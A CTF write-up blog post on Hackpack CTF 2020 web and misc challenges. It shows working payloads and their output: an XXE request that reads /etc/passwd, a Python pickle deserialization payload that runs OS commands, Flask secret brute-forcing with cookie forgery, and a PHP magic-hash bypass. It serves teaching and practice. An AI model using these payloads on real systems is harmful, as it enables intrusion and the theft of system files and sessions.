<!DOCTYPE html>
<html class="no-js">
<head>
    <meta charset="utf-8">
    <title>Hackpack CTF 2020 | maggick's logs</title>

    <meta name="author" content="maggick">
    <meta name="description" content="">
    <meta name="robots" content="">
        <meta name="keywords" content="">
        <meta property="og:title" content="">
        <meta property="og:description" content="">
        <meta property="og:url" content="">
        <meta property="og:image" content="">
    <meta property="og:site_name" content="maggick's logs">
    <meta property="og:type" content="website">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">

        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">

    <link rel="canonical" href="">

    <link rel="stylesheet" href="../../theme/css/pure-min.css">
    <link rel="stylesheet" href="../../theme/css/main.css">
</head>
<body>
<div id="page" class="full-entry">
    <header class="pure-g-r header">
        <div class="pure-u-1">
            <div class="wrapper">
                <div class="l-box">
                    <a href="../../index.html" title="Home page"
                            class="logo">maggick's
<span class="secondary">logs</span>                    </a>
                </div>
            </div>

<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
    <ul>
            <li>
              |
            </li>
                <li>
                    <a href="../../pages/about.html">About</a>
                </li>
                <li>
                    <a href="../../pages/notes.html">Notes</a>
                </li>
    </ul>
</nav>        </div>
    </header>

    <div class="pure-g-r wrapper">
        <section class="content pure-u-17-24">
            <div class="l-box">

<article class="entry">

    <header class="entry-header">
        <h1 class="entry-title">
      <a href="../../2020/04/hackpack-ctf-2020.html" title="Read more" class="entry-title-link">
                Hackpack CTF 2020</a>
        </h1>

        <div class="entry-date">
            <time datetime="2020-04-28T08:50:00+02:00">28 Apr 2020</time>
        </div>

    <div class="entry-meta">
      <span class="meta entry-author">
        <span class="icons icons-author"></span>
        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
      </span>

      <span class="meta entry-tags">
        <span class="icons icons-category"></span>
          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
          <a href="../../tag/ctf.html" title="Read more with the label CTF" class="meta-link">CTF</a> 
          <a href="../../tag/web.html" title="Read more with the label web" class="meta-link">web</a> 
      </span>
              <span class="meta entry-tags">
              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 9 minutes</p></span>
    </div>
    </header>

    <div class="entry-content">
            <p><img class="align-left" src="/media/2020.04/hackpack_logo.png" alt="Hackpack CTF logo" width="262"></p>
<p>This weekend I participate to the Hackpack CTF with the team <code>hackers for the jilted generation</code>
(mostly me this time). We finished 126th with 811 points.
Here are some writeup about the challenges.</p>


<h1 id="web">Web</h1>
<h2 id="treasure-map">Treasure Map</h2>
<blockquote>
<p>Hmm, do pirates really think they can hide a treasure without us knowing? Find the treasure and prove they are wrong. Check here: treasure-map.cha.hackpack.club</p>
</blockquote>
<p>The webpage contain the following:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>Treasure of the Pirates!</span>
<span class="code-line">It should in some of this (or hidden) island!</span>
<span class="code-line"></span>
<span class="code-line">Hint: you need a map of this place to find it!</span>
<span class="code-line"></span>
<span class="code-line">Island #0</span>
<span class="code-line">Island #1</span>
<span class="code-line">&lt;SNIP&gt;</span>
<span class="code-line">Island #9998</span>
<span class="code-line">Island #9999</span>
<span class="code-line"></code></pre></div>

<p>We are looking for the map. We check <code>robots.txt</code>: it contains: <code>Sitemap: /treasuremap.xml</code></p>
<p>The file <code>/treasuremap.xml</code> contain the location of the "treasure":</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="p">&lt;</span><span class="nt">urlset</span><span class="p">&gt;</span></span>
<span class="code-line"><span class="p">&lt;</span><span class="nt">url</span><span class="p">&gt;</span></span>
<span class="code-line"><span class="p">&lt;</span><span class="nt">loc</span><span class="p">&gt;</span>7BmqJfhWhEa30NeVj7j2.html<span class="p">&lt;/</span><span class="nt">loc</span><span class="p">&gt;</span></span>
<span class="code-line"><span class="p">&lt;</span><span class="nt">lastmod</span><span class="p">&gt;</span>2005-01-01<span class="p">&lt;/</span><span class="nt">lastmod</span><span class="p">&gt;</span></span>
<span class="code-line"><span class="p">&lt;</span><span class="nt">changefreq</span><span class="p">&gt;</span>monthly<span class="p">&lt;/</span><span class="nt">changefreq</span><span class="p">&gt;</span></span>
<span class="code-line"><span class="p">&lt;</span><span class="nt">priority</span><span class="p">&gt;</span>0.8<span class="p">&lt;/</span><span class="nt">priority</span><span class="p">&gt;</span></span>
<span class="code-line"><span class="p">&lt;/</span><span class="nt">url</span><span class="p">&gt;</span></span>
<span class="code-line"><span class="p">&lt;/</span><span class="nt">urlset</span><span class="p">&gt;</span></span>
<span class="code-line"></code></pre></div>

<p>And the "treasure" contain the flag: <code>flag{tr3asur3_hunt1ng_fUn}</code></p>
<h2 id="super-secret-flag-vault">Super Secret Flag Vault</h2>
<blockquote>
<p>See if you can get into the super secret flag vault! I have used the latest and greatest techniques with php to make sure you cant get past my vault.</p>
</blockquote>
<p>The <code>index.php</code> file is available:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="cp">&lt;?php</span></span>
<span class="code-line">      <span class="c1">// this is how I store hashes right?</span></span>
<span class="code-line">      <span class="nv">$hash</span> <span class="o">=</span> <span class="s2">&quot;0e770334890835629000008642775106&quot;</span><span class="p">;</span></span>
<span class="code-line">      <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;combination&quot;</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;combination&quot;</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">&#39;&#39;</span><span class="p">){</span></span>
<span class="code-line">          <span class="c1">//Isn&#39;t it great that == works in every language?</span></span>
<span class="code-line">          <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;debug&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)){</span></span>
<span class="code-line">              <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt; &quot;</span><span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;combination&quot;</span><span class="p">]);</span></span>
<span class="code-line">          <span class="p">}</span></span>
<span class="code-line">          <span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;combination&quot;</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$hash</span><span class="p">){</span></span>
<span class="code-line">              <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt; The Flag is flag{...}&lt;br&gt;&quot;</span><span class="p">;</span></span>
<span class="code-line">          <span class="p">}</span></span>
<span class="code-line">          <span class="k">else</span><span class="p">{</span></span>
<span class="code-line">              <span class="k">echo</span> <span class="s2">&quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;</span><span class="p">;</span></span>
<span class="code-line">          <span class="p">}</span></span>
<span class="code-line"></span>
<span class="code-line">      <span class="p">}</span></span>
<span class="code-line"><span class="cp">?&gt;</span><span class="x"></span></span>
<span class="code-line"></code></pre></div>

<p>The value of hash is just a number using scientific notation. This is a <a href="https://www.php.net/manual/en/language.operators.comparison.php">php loose
comparison</a>.
Using a input that will also be considered as a number will set the condition to true.
We use <code>240610708</code>, which md5 hash is <code>0e462097431906509019562988736854</code>, as a
password and we got the flag.</p>
<blockquote>
<p>The Flag is flag{!5_Ph9_5TronGly_7yPed?}</p>
</blockquote>
<h2 id="paster">Paster</h2>
<blockquote>
<p>Come and BETA Test our new social networking site. Its like twitter but shorter
Go checkout Paster now</p>
</blockquote>
<p>The site looks like the following:</p>
<p><img alt="Paster" src="/media/2020.04/hackpack_paster.png"></p>
<p>When looking at the downloaded content we fount that the file
<code>frames/game-frame.js</code> is downloaded. It contains 248 311 characters as the
following:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+</span>
<span class="code-line">(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+</span>
<span class="code-line">[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])</span>
<span class="code-line">[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+</span>
<span class="code-line">(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]</span>
<span class="code-line">&lt;SNIP&gt;</span>
<span class="code-line"></code></pre></div>

<p>This is <a href="http://www.jsfuck.com/">JSfuck</a>. We use an
<a href="https://enkhee-osiris.github.io/Decoder-JSFuck/">online decoder</a> to decode it.
The output is some clear JavaScript.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code><span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">toString</span><span class="p">(),</span><span class="s2">&quot;*&quot;</span><span class="p">);</span><span class="kd">var</span><span class="w"> </span><span class="nx">originalAlert</span><span class="o">=</span><span class="nb">window</span><span class="p">.</span><span class="w"></span></span>
<span class="code-line"><span class="nx">alert</span><span class="p">;</span><span class="nb">window</span><span class="p">.</span><span class="nx">alert</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">t</span><span class="p">){</span><span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s2">&quot;success&quot;</span><span class="p">,</span><span class="s2">&quot;*&quot;</span><span class="p">),</span><span class="w"></span></span>
<span class="code-line"><span class="nx">flag</span><span class="o">=</span><span class="nx">atob</span><span class="p">(</span><span class="s2">&quot;ZmxhZ3t4NTVfaTVOdF83aEE3X2JBRF9SMUdoNz99&quot;</span><span class="p">),</span><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"></span></span>
<span class="code-line"><span class="p">{</span><span class="nx">originalAlert</span><span class="p">(</span><span class="s2">&quot;Congratulations, you executed an alert:\n\n&quot;</span><span class="o">+</span><span class="nx">t</span><span class="o">+</span><span class="s2">&quot;\n\nhere is the flag: &quot;</span><span class="o">+</span><span class="nx">flag</span><span class="p">)},</span><span class="mf">50</span><span class="p">)};</span><span class="w"></span></span>
<span class="code-line"></code></pre></div>

<p>We where probably supposed to do some XSS to get the flag but we got it either
way.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>$ echo -ne &#39;ZmxhZ3t4NTVfaTVOdF83aEE3X2JBRF9SMUdoNz99&#39; | base64 -d</span>
<span class="code-line">flag{x55_i5Nt_7hA7_bAD_R1Gh7?}[</span>
<span class="code-line"></code></pre></div>

<h2 id="cookie-forge">Cookie Forge</h2>
<blockquote>
<p>Help a new local cookie bakery startup shake down their new online ordering and loyalty rewards portal at cookie-forge.cha.hackpack.club!</p>
<p>I wonder if they will sell you a Flask of milk to go with your cookies...</p>
</blockquote>
<p>The website is using flask. A page is reserved for premium member.</p>
<p>We know that <a href="https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce">flask cookie have some issues</a>.</p>
<p>We place an order. Login as <code>toto:toto</code> get the cookie and pass it to
<code>flask-unsign</code>. The tool can decode it as the secret is only use to sign the
cookie.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>$flask-unsign -d -c &#39;eyJmbGFnc2hpcCI6ZmFsc2UsInVzZXJuYW1lIjoidG90byJ9.Xp2SeA.1l6nDFaIsDZ8bCXcxdtORRVIBK0&#39;</span>
<span class="code-line">{&#39;flagship&#39;: False, &#39;username&#39;: &#39;toto&#39;}</span>
<span class="code-line"></code></pre></div>

<p>We need to get the secret to forge our own cookie</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>$ flask-unsign --server https://cookie-forge.cha.hackpack.club/orders --unsign</span>
<span class="code-line">[*] Server returned HTTP 302 (Found)</span>
<span class="code-line">[+] Successfully obtained session cookie: eyJfZmxhc2hlcyI6W3siIHQiOlsid2FybmluZyIsIllvdSBtdXN0IGxvZyBpbiBmaXJzdCEiXX1dfQ.Xp2TwA.IiGnkGfSx0j-O_vLTjmUyU95zLQ</span>
<span class="code-line">[*] Session decodes to: {&#39;_flashes&#39;: [(&#39;warning&#39;, &#39;You must log in first!&#39;)]}</span>
<span class="code-line">[*] No wordlist selected, falling back to default wordlist..</span>
<span class="code-line">[*] Starting brute-forcer with 8 threads..</span>
<span class="code-line">[+] Found secret key after 39090 attempts</span>
<span class="code-line">&#39;password1&#39;</span>
<span class="code-line"></code></pre></div>

<p>We modify the <code>flagship</code> value and sign our cookie with the secret <code>password1</code></p>
<div class="highlight"><pre><span class="code-line"><span></span><code>$ flask-unsign --sign --secret password1 --cookie &quot;{&#39;flagship&#39;: True, &#39;username&#39;: &#39;toto&#39;}&quot;</span>
<span class="code-line">eyJmbGFnc2hpcCI6dHJ1ZSwidXNlcm5hbWUiOiJ0b3RvIn0.Xp2TRQ.XlXCKJYANDb9ghp5ms_fKQhTkVY</span>
<span class="code-line"></code></pre></div>

<p>Using Burp repeater we modify our cookie to get the flag</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>GET /flag HTTP/1.1</span>
<span class="code-line">Host: cookie-forge.cha.hackpack.club</span>
<span class="code-line">Cookie: session=eyJmbGFnc2hpcCI6dHJ1ZSwidXNlcm5hbWUiOiJ0b3RvIn0.Xp2TRQ.XlXCKJYANDb9ghp5ms_fKQhTkVY</span>
<span class="code-line">Upgrade-Insecure-Requests: 1</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">HTTP/1.1 200 OK</span>
<span class="code-line">Content-Length: 2617</span>
<span class="code-line">Content-Type: text/html; charset=utf-8</span>
<span class="code-line">Date: Mon, 20 Apr 2020 12:26:22 GMT</span>
<span class="code-line">Server: meinheld/1.0.1</span>
<span class="code-line">Vary: Cookie</span>
<span class="code-line">&lt;SNIP&gt;</span>
<span class="code-line">&lt;p&gt;You are a &lt;em&gt;special&lt;/em&gt; customer!</span>
<span class="code-line">    To come back for more, sugar-coma after sugar-coma, in the face of mounting pressure from your doctors,</span>
<span class="code-line">    your family, and your own common sense&amp;hellip;</span>
<span class="code-line">    &lt;strong&gt;That&#39;s&lt;/strong&gt; dedication.</span>
<span class="code-line">&lt;/p&gt;</span>
<span class="code-line">&lt;p&gt;Just to show our appreciation for your morbid commitment to our life-altering products, we&#39;re giving you this flag:&lt;/p&gt;</span>
<span class="code-line">&lt;code&gt;flag{0h_my_@ch1ng_p@ncre@5_th33$3_@r3_d3l1c10$0}&lt;/code&gt;</span>
<span class="code-line"></code></pre></div>

<h2 id="custom-ui">Custom UI</h2>
<blockquote>
<p>How often do you visit the website just to bounce back because of bad design? Now we developed a new feature, which gives you the ability to change the design! Check out a new feature: custom-ui.cha.hackpack.club</p>
</blockquote>
<p><img alt="page" src="/media/2020.04/hackpack_custom_ui.png"></p>
<p>We can input data to change the button color and add text to it. If we input
<code>&lt;script&gt;</code> we trigger an error:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>Warning: DOMDocument::loadXML(): Opening and ending tag mismatch: script line 1 and value in Entity, line: 1 in /var/www/html/index.php on line 12</span>
<span class="code-line">Warning: DOMDocument::loadXML(): Opening and ending tag mismatch: value line 1 and button in Entity, line: 1 in /var/www/html/index.php on line 12</span>
<span class="code-line">Warning: DOMDocument::loadXML(): Premature end of data in tag button line 1 in Entity, line: 1 in /var/www/html/index.php on line 12</span>
<span class="code-line">Warning: simplexml_import_dom(): Invalid Nodetype to import in /var/www/html/index.php on line 13</span>
<span class="code-line"></code></pre></div>

<p>Therefore we will go for a <a href="https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection">XML External Entity (XXE) Injection</a>.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>POST /? HTTP/1.1</span>
<span class="code-line">Host: custom-ui.cha.hackpack.club</span>
<span class="code-line">Content-Type: application/x-www-form-urlencoded</span>
<span class="code-line">Cookie: debug=false</span>
<span class="code-line">Content-Length: 198</span>
<span class="code-line"></span>
<span class="code-line">xdata=%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxez1rnx%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxez1rnx%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e</span>
<span class="code-line"></span>
<span class="code-line">&lt;SNIP&gt;</span>
<span class="code-line">&lt;body&gt;</span>
<span class="code-line">  &lt;div style=&quot;max-width:600px; margin:auto&quot;&gt;</span>
<span class="code-line">    &lt;h1&gt;Your custom button!&lt;/h1&gt;</span>
<span class="code-line">          &lt;button style=&quot;background-color: root:x:0:0:root:/root:/bin/bash</span>
<span class="code-line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
<span class="code-line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
<span class="code-line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
<span class="code-line">sync:x:4:65534:sync:/bin:/bin/sync</span>
<span class="code-line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
<span class="code-line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
<span class="code-line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
<span class="code-line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
<span class="code-line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
<span class="code-line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
<span class="code-line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
<span class="code-line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
<span class="code-line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
<span class="code-line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
<span class="code-line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span>
<span class="code-line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
<span class="code-line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
<span class="code-line">_apt:x:100:65534::/nonexistent:/bin/false</span>
<span class="code-line">; padding: 15px 32px;&quot;&gt;</span>
<span class="code-line">&lt;SNIP&gt;</span>
<span class="code-line"></code></pre></div>

<p>We change the <code>debug</code> cookie to <code>true</code> and we get a comment at the bottom of the
page: <code>&lt;!-- TODO: Delete flag.txt from /etc/ --&gt;&lt;/body&gt;</code></p>
<div class="highlight"><pre><span class="code-line"><span></span><code>POST /? HTTP/1.1</span>
<span class="code-line">Host: custom-ui.cha.hackpack.club</span>
<span class="code-line">Content-Type: application/x-www-form-urlencoded</span>
<span class="code-line">Cookie: debug=false</span>
<span class="code-line">Content-Length: 200</span>
<span class="code-line"></span>
<span class="code-line">xdata=%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxez1rnx%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fflag.txt%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxez1rnx%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e</span>
<span class="code-line"></span>
<span class="code-line">&lt;SNIP&gt;</span>
<span class="code-line">&lt;button style=&quot;background-color: flag{d1d_y0u_kn0w_th@t_xml_can_run_code?}; padding: 15px 32px;&quot;&gt;</span>
<span class="code-line">&lt;SNIP&gt;</span>
<span class="code-line"></code></pre></div>

<h1 id="misc">Misc</h1>
<h2 id="ssme">SSME</h2>
<blockquote>
<p>Welcome to our Super Secure Message Encrypter (SSME - copyright pending)
nc cha.hackpack.club 41704</p>
</blockquote>
<p>We connect to the service. We encrypt the string <code>qq</code> and decode it.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>$ nc cha.hackpack.club 41704</span>
<span class="code-line">[*] Welcome to our Super Secure Message Encrypter (SSME - copyright pending)</span>
<span class="code-line">[*] We use patented technology that only we have access to in order to safely encrypt your data</span>
<span class="code-line">[*] Please use this tool to encrypt/decrypt messages</span>
<span class="code-line"></span>
<span class="code-line">[*] Please select from the following options</span>
<span class="code-line">1.) Encrypt a message</span>
<span class="code-line">2.) Read a message</span>
<span class="code-line">3.) Quit</span>
<span class="code-line">&gt; 1</span>
<span class="code-line">What would you like to encrypt? qq</span>
<span class="code-line">[+] Message encrypted: gANYAgAAAHFxcQAu</span>
<span class="code-line"></span>
<span class="code-line"></span>
<span class="code-line">[*] Please select from the following options</span>
<span class="code-line">1.) Encrypt a message</span>
<span class="code-line">2.) Read a message</span>
<span class="code-line">3.) Quit</span>
<span class="code-line">&gt; 2</span>
<span class="code-line">Please enter the encrypted string here: gANYAgAAAHFxcQAu</span>
<span class="code-line">[+] Message decrypted: qq</span>
<span class="code-line"></code></pre></div>

<p>Then we send a malformed input for the decryption, that generate an error:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>[*] Please select from the following options</span>
<span class="code-line">1.) Encrypt a message</span>
<span class="code-line">2.) Read a message</span>
<span class="code-line">3.) Quit</span>
<span class="code-line">&gt; 2</span>
<span class="code-line">Please enter the encrypted string here: gANYAgAAAHFxc</span>
<span class="code-line">Traceback (most recent call last):</span>
<span class="code-line">  File &quot;/usr/lib/python3.6/encodings/base64_codec.py&quot;, line 19, in base64_decode</span>
<span class="code-line">    return (base64.decodebytes(input), len(input))</span>
<span class="code-line">  Fle &quot;/usr/lib/python3.6/base64.py&quot;, line 546, in decodebytes</span>
<span class="code-line">    return binascii.a2b_base64(s)</span>
<span class="code-line">binascii.Error: Incorrect padding</span>
<span class="code-line"></span>
<span class="code-line">The above exception was the direct cause of the following exception:</span>
<span class="code-line"></span>
<span class="code-line">Traceback (most recent call last):</span>
<span class="code-line">  File &quot;/home/challenger/app.py&quot;, line 46, in &lt;module&gt;</span>
<span class="code-line">    main()</span>
<span class="code-line">  File &quot;/home/challenger/app.py&quot;, line 37, in main</span>
<span class="code-line">    dec = decrypt(to_dec)</span>
<span class="code-line">  File &quot;/home/challenger/app.py&quot;, line 24, in decrypt</span>
<span class="code-line">    return pickle.loads(codecs.decode(to_dec.encode(), &quot;base64&quot;))</span>
<span class="code-line">binascii.Error: decoding with &#39;base64&#39; codec failed (Error: Incorrect padding)i</span>
<span class="code-line"></code></pre></div>

<p>The error disclose the use of the python pickle which are know to be vulnerable
an allowing command execution.</p>
<p>We create a pickle to execute OS commands on the system:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;&gt;&gt; import pickle</span>
<span class="code-line">&gt;&gt;&gt; import subprocess</span>
<span class="code-line">&gt;&gt;&gt; import base64</span>
<span class="code-line">&gt;&gt;&gt;</span>
<span class="code-line">&gt;&gt;&gt; class RunBinSh(object):</span>
<span class="code-line">...   def __reduce__(self):</span>
<span class="code-line">...     return (subprocess.Popen, ((&#39;ls&#39;,),))</span>
<span class="code-line">...</span>
<span class="code-line">&gt;&gt;&gt; print base64.b64encode(cPickle.dumps(RunBinSh()))</span>
<span class="code-line">b&#39;gASVIwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwCbHOUhZSFlFKULg==&#39;</span>
<span class="code-line"></code></pre></div>

<p>We decode the generate pickle</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>$ nc cha.hackpack.club 41704</span>
<span class="code-line">[*] Welcome to our Super Secure Message Encrypter (SSME - copyright pending)</span>
<span class="code-line">[*] We use patented technology that only we have access to in order to safely encrypt your data</span>
<span class="code-line">[*] Please use this tool to encrypt/decrypt messages</span>
<span class="code-line"></span>
<span class="code-line">[*] Please select from the following options</span>
<span class="code-line">1.) Encrypt a message</span>
<span class="code-line">2.) Read a message</span>
<span class="code-line">3.) Quit</span>
<span class="code-line">&gt; 2</span>
<span class="code-line">Please enter the encrypted string here: gASVIwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwCbHOUhZSFlFKULg==</span>
<span class="code-line">[+] Message decrypted: &lt;subprocess.Popen object at 0x7f2b6d9a9550&gt;</span>
<span class="code-line"></span>
<span class="code-line">[*] Please select from the following options</span>
<span class="code-line">1.) Encrypt a message</span>
<span class="code-line">2.) Read a message</span>
<span class="code-line">3.) Quit</span>
<span class="code-line">&gt; app.py</span>
<span class="code-line">flag.txt</span>
<span class="code-line"></code></pre></div>

<p>We generate a new pickle to read the flag:</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>&gt;&gt;&gt; class RunBinSh(object):</span>
<span class="code-line">...   def __reduce__(self):</span>
<span class="code-line">...     return (subprocess.Popen, ((&#39;cat&#39;, &#39;flag.txt&#39;,),))</span>
<span class="code-line">...</span>
<span class="code-line">&gt;&gt;&gt; print(base64.b64encode(pickle.dumps(RunBinSh())))</span>
<span class="code-line">b&#39;gASVLwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwIZmxhZy50eHSUhpSFlFKULg==&#39;</span>
<span class="code-line"></span>
<span class="code-line">Please enter the encrypted string here: gASVLwAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwIZmxhZy50eHSUhpSFlFKULg==</span>
<span class="code-line">[+] Message decrypted: &lt;subprocess.Popen object at 0x7f2b6d9a4438&gt;</span>
<span class="code-line"></span>
<span class="code-line">[*] Please select from the following options</span>
<span class="code-line">1.) Encrypt a message</span>
<span class="code-line">2.) Read a message</span>
<span class="code-line">3.) Quit</span>
<span class="code-line">&gt; flag{n3v3R_u$e_p!ckLe_w_uNtru$t3d_d4t4}</span>
<span class="code-line"></code></pre></div>

<h2 id="hiding-in-plaintext">Hiding in Plaintext</h2>
<blockquote>
<p>Connect to CryptoKid's Mall of MirrXors at cha.hackpack.club:41715 to try your hand at guessing the flag!
(Mr. Vernam says CryptoKid stole his ideas, but Miss Venona says he stole them...badly...)</p>
</blockquote>
<p>We understand that the service is doing XOR encryption. We connect to it and
thee that there is the encrypted flag and that we can encrypt anything we want.</p>
<div class="highlight"><pre><span class="code-line"><span></span><code>$ nc cha.hackpack.club 41715</span>
<span class="code-line">Welcome to CryptoKid&#39;s Hall of MirrXors!</span>
<span class="code-line">Here is BASE64(ENC(FLAG, SESSION_KEY)) =&gt; bwHJ1+IUTxTLWyYalXkyC3m5B4lRj+4BerJ3S/WxWj4kKbbqdx/M6nh8bCE+C0ZjJJc9hKHMPSTwUQ==</span>
<span class="code-line">Wanna guess what FLAG is? qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq</span>
<span class="code-line">Here is BASE64(ENC(GUESS, SESSION_KEY)) =&gt; eBzZwegLDhGXXj9YyWVzCXzlR5VQjKwDePJwCamwRw9kNrOofhqQ7Xxhc30tD0M/Io582LP9PmbyXXgc2cHoCw4Rl14/WMllcwl85UeVUIysA3jy</span>
<span class="code-line">How&#39;d you do??</span>
<span class="code-line"></code></pre></div>

<p>We have a known clear text attack on a XOR encryption. We just need to XOR the
encoded flag to our encrypted plain text <code>qqqqqq…</code> then XOR it again with our
clear plain text. Here is the
<a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'Base64','string':'eBzZwegLDhGXXj9YyWVzCXzlR5VQjKwDePJwCamwRw9kNrOofhqQ7Xxhc30tD0M/Io582LP9PmbyXXgc2cHoCw4Rl14/WMllcwl85UeVUIysA3jy'%7D,'Standard',false)XOR(%7B'option':'Latin1','string':'qqqqqqqqqqqqq'%7D,'Standard',false)&input=YndISjErSVVUeFRMV3lZYWxYa3lDM201QjRsUmorNEJlckozUy9XeFdqNGtLYmJxZHgvTTZuaDhiQ0UrQzBaakpKYzloS0hNUFNUd1VRPT0">
Cyber Chef recipe </a> that give us the flag: <code>flag{n0t-th3-m0st-1mpr3ss1v3-pl@1nt3xt-vuln-but-wh0-c@r3s}</code>.</p>
<h1 id="wrapping-up">Wrapping up</h1>
<p>This was a nice CTF as the challenges were quite doable.</p>
<p><img alt="score board" src="/media/2020.04/hackpack_scoreboard.png"></p>
    </div>

      <footer>
          <div>
            <b>Previous article:</b> <a href="../../2020/04/htb-mango.html"> HTB: Mango </a>
          </div>
          <div>
            <b>Next article:</b> <a href="../../2020/05/htb-openadmin.html"> HTB: OpenAdmin </a>
          </div>

<div class="social-buttons">


</div>
      </footer>


    <div class="clearfix"></div>

</article>
<!-- /.entry -->
            </div>
        </section>

        <aside class="sidebar pure-u-7-24">
            <div class="l-box">
    <section class="module menuitems">
        <h3 class="title module-title">Menu</h3>

        <ul>
                <li>
                    <span class= "icons icons-archives"></span>
                    <a href="/archives">archives</a>
                </li>
                <li>
                    <span class= "icons icons-feeds"></span>
                    <a href="/feeds/all.atom.xml">feeds</a>
                </li>
                <li>
                    <span class= "icons icons-links"></span>
                    <a href="/pages/links.html">links</a>
                </li>
        </ul>
    </section>

    <section class="module social">
        <h3 class="title module-title">Social</h3>

        <ul>
                <li>
                    <span class= "icons icons-github"></span>
                    <a href="https://github.com/maggick">github</a>
                </li>
                <li>
                    <span class= "icons icons-twitter"></span>
                    <a href="https://twitter.com/maggick_fr">twitter</a>
                </li>
                <li>
                    <span class= "icons icons-stackoverflow"></span>
                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
